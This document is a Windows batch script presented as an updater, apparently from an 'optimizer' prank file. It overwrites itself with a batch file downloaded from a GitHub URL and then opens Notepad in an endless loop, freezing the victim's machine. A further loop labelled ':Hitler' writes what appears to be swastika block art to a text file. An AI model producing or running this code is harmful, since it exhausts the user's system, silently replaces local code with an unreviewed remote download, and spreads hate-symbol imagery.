::Updater
echo ---------------------------------------------------------------------------
echo                                  Updating
echo.
set "filePath=%~f0"
copy "%filePath%" "%filePath%.old"
curl "https://raw.githubusercontent.com/Izaiashi/Random-Batch-Shit/main/optimizer-api.bat" -o "%filePath%"
echo.
echo ---------------------------------------------------------------------------
echo.

timeout 2 > NUL
cls

::Loops

:Notepad
	start "" notepad.exe
	goto :Notepad
	goto :Hitler

:Hitler  
	echo.
	echo ▓▓▓▓▓▓▀▀░░░░░░▀▀▓▓▓▓▓▓ > prank.txt
	echo ▓▓▓▀░░░░░▄██▄░░░░░▀▓▓▓ >> prank.txt
	echo ▓▓░░░░░▄▄██▀░░░░░░░░▓▓ >> prank.txt
	echo ▓░░░░░▄██▀░░░▄█▄░░░░░▓ >> prank.txt
	echo ▌░░░░░▀██▄▄▄█████▄░░░▐ >> prank.txt
  	echo ░░▄▄▄░░░▀████▀░▀▀██▄░░ >> prank.txt
  	echo ░░▀██▄░▄▄████▄░░░▀▀▀░░ >> prank.txt
  	echo ▌░░░▀█████▀▀▀██▄░░░░░▐ >> prank.txt
  	echo ▓░░░░░▀█▀░░░▄██▀░░░░░▓ >> prank.txt
  	echo ▓▓░░░░░░░░▄██▀░░░░░░▓▓ >> prank.txt
  	echo ▓▓▓▄░░░░░▀█▀▀░░░░░▄▓▓▓ >> prank.txt
  	echo ▓▓▓▓▓▓▄▄░░░░░░▄▄▓▓▓▓▓▓ >> prank.txt
  	goto :Hitler
	goto :Notepad
